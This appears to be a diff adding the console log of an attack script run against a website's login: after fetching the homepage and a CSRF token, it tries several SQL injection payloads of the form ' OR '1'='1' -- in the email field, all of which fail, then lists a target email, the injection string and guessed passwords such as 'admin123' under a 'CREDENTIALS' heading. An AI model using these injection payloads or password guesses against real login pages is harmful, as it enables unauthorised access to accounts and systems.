@@ -1,0 +1,18 @@
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.4/1.4 MB 23.2 MB/s eta 0:00:00
+Installing collected packages: brotli
+Successfully installed brotli-1.2.1
+---
+Homepage: 12718 bytes
+CSRF: yb8y98aoV63hYUEFiYALEoE0DtvKfb...
+
+[*] SQLi Login Attempts:
+  ❌ Email error: admin@example.com' OR '1'='1' -- 
+  ❌ Email error: nama@email.com' OR '1'='1' -- 
+  ❌ Email error: admin' OR '1'='1' -- 
+
+[*] Admin email login attempts:
+
+=== CREDENTIALS ===
+📧 Email: nama@email.com
+🔑 SQLi: nama@email.com' OR '1'='1' -- 
+🔑 Password: coba 'admin123' atau 'test123'
